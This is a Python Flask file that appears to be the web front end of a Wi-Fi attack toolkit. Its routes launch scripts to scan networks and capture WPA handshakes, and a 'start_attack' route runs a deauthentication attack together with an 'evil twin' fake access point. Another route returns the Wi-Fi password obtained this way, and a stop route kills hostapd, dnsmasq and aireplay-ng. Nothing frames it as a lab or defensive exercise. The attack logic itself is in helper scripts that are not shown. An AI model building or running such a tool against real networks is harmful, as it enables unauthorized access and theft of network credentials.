from flask import Flask, render_template, request, jsonify
import subprocess
import json
import os

# Initialize Flask App
app = Flask(__name__, template_folder="templates")

# Define the absolute path to the scripts directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SCRIPTS_DIR = os.path.join(BASE_DIR, "../scripts")

@app.route('/')
def index():
    """Render the main web interface."""
    return render_template('index.html')

@app.route('/scan', methods=['GET'])
def scan_networks():
    """Scans for available Wi-Fi networks and returns JSON response."""
    try:
        result = subprocess.run(["python3", os.path.join(SCRIPTS_DIR, "scan.py")], capture_output=True, text=True)
        
        # Debugging: Print scan.py output to terminal
        print(f"[DEBUG] scan.py Output: {result.stdout}")

        networks = json.loads(result.stdout.strip())  # Parse JSON output

        return jsonify(networks)
    except json.JSONDecodeError as e:
        return jsonify({"error": "Invalid JSON output from scan.py", "details": str(e)}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/capture', methods=['POST'])
def start_capture():
    """Starts handshake capture on the selected SSID."""
    ssid = request.json.get("ssid")
    if not ssid:
        return jsonify({"error": "SSID is required"}), 400

    try:
        subprocess.Popen(["python3", os.path.join(SCRIPTS_DIR, "capture.py"), ssid])
        return jsonify({"status": f"Capturing handshake for {ssid}"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/start_attack', methods=['POST'])
def start_attack():
    """Starts Deauth Attack and Evil Twin."""
    ssid = request.json.get("ssid")
    bssid = request.json.get("bssid")

    if not ssid or not bssid:
        return jsonify({"error": "SSID and BSSID are required"}), 400

    try:
        subprocess.Popen(["python3", os.path.join(SCRIPTS_DIR, "deauth.py"), bssid])
        subprocess.Popen(["python3", os.path.join(SCRIPTS_DIR, "evil_twin_validate.py"), ssid])

        return jsonify({"status": f"Deauth & Evil Twin Started for {ssid}"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/get_password', methods=['GET'])
def get_password():
    """Retrieves the obtained Wi-Fi password."""
    password_file = os.path.join(SCRIPTS_DIR, "wifi_password.txt")

    try:
        if os.path.exists(password_file):
            with open(password_file, "r") as file:
                password = file.read().strip()
            return jsonify({"wifi_password": password})
        else:
            return jsonify({"wifi_password": "Not found yet."})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    """Stops all attacks."""
    try:
        os.system("sudo pkill hostapd")
        os.system("sudo pkill dnsmasq")
        os.system("sudo pkill aireplay-ng")
        return jsonify({"status": "All attacks stopped!"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)
